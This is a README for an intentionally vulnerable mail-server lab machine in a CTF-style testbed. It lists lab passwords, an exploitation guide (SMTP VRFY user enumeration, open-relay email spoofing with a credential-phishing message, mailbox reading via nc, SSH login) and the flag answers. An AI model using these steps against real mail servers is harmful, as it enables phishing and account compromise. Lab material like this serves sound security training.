# 🏢 VulnCorp — Machine 2: dmz-mail01 (Mail Server)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Machine 2 in the VulnCorp Enterprise testbed simulates a corporate mail server in the **DMZ Zone (`10.10.10.20`)** with intentional misconfigurations: **SMTP Open Relay**, **Plaintext Authentication (Dovecot)**, and **Internal Credential Breadcrumbs** hidden inside user mailboxes.

---

## 🚀 Quick Start (One-Command Deploy)

Run this on your **Ubuntu 24.04 LTS VM** `dmzmail01` (`10.10.10.20`).

Spec services: Postfix 3.7.11, Dovecot 2.3.19.1, Roundcube 1.4.14, Apache 2.4.59.

```bash
# Clone the repository
git clone https://github.com/YOUR_GITHUB_USERNAME/webserver.git
cd webserver/machines/dmz-mail01

# Run deployment
chmod +x deploy.sh
sudo ./deploy.sh
```

Or deploy directly via Docker Compose:
```bash
docker compose up -d --build
```

---

## 📡 Exposed Ports & Services

| Service | Port | Description | Vulnerability |
|---------|------|-------------|---------------|
| **SMTP** | `25` | Postfix ESMTP | **Open Relay** (relays any email to any domain), User Enumeration via `VRFY`/`EXPN` |
| **POP3** | `110` | Dovecot POP3 | Cleartext authentication allowed (no TLS required) |
| **IMAP** | `143` | Dovecot IMAP | Cleartext authentication allowed (no TLS required) |
| **HTTP** | `80` | Web Interface | Server banner information disclosure |
| **SSH** | `2222` / `22` | OpenSSH | Root login allowed, weak passwords |

---

## 🎯 Configured Accounts & Passwords

| Username | Password | Purpose / Breadcrumbs |
|----------|----------|-----------------------|
| `admin` | `Admin@2024!` | Mailbox contains VPN access credentials (`172.16.0.20`) |
| `sysadmin` | `Sysadmin#99` | Mailbox contains Database credentials (`172.16.0.10`) |
| `developer` | `dev123` | Mailbox contains internal network diagram update |
| `helpdesk` | `Helpdesk@123` | General support user account |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. User Enumeration via SMTP VRFY
```bash
telnet 10.10.10.20 25
VRFY admin
VRFY sysadmin
VRFY root
```

### 2. SMTP Open Relay Testing (Phishing Simulation)
```bash
telnet 10.10.10.20 25
HELO attacker.com
MAIL FROM: <spoofed@company.com>
RCPT TO: <victim@external.com>
DATA
Subject: Urgent IT Notice
Please update your credentials immediately.
.
QUIT
```

### 3. Reading Sensitive Mailbox Messages via IMAP / POP3
```bash
# Connect via nc or telnet
nc 10.10.10.20 110
USER admin
PASS Admin@2024!
LIST
RETR 1
```

### 4. SSH Access
```bash
ssh admin@10.10.10.20 -p 2222
# Password: Admin@2024!
```

---

## 🏆 Flags

- **Mail Phishing Flag:** `/home/admin/flag.txt` (`VULN{m41l_ph1sh_cr3ds}`)
- **SMTP Open Relay Flag:** `/tmp/smtp_flag.txt` (`VULN{sm7p_0p3n_r3l4y}`)
- **Root Flag:** `/root/root.txt` (`VULN{m41l_s3rv3r_r00t3d_m4ch1n3_2}`)

---

## 🧹 Teardown & Cleanup

```bash
docker compose down --rmi all --volumes
```
